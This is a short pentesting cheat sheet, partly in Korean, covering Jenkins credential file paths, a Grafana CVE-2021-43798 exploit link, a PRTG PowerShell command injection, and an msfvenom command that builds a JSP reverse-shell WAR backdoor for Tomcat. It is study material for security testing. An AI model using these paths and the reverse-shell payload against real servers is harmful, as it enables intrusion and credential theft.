# jenkins
- initial password : `<home directory>/secrets/initialAdminPassword`
- user accounts: `<home directory>/users/users.xml`
- user config file : `<home directory>/users/<user>/config.xml`
---
# grafana
- password : PBKDF2-HMAC-SHA256
- https://github.com/jas502n/Grafana-CVE-2021-43798
---
# PRTG(< 18.2.39 Command Injection Vulnerability)
- config file location : `/programdata/Paessler/PRTG Network Monitor`
- https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/

- `the argument supplied in the “Parameter” field of the “Notifications” configuration is passed directly into the PowerShell script without any sanitization, resulting in the ability into inject any other PowerShell code.`
---
# Apache Tomcat
- JSP : 웹에서 동적 콘텐츠를 생성하기 위한 기술.
- Tomat은 JSP를 실행시키도록 개발됨.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > backdoor.war
```
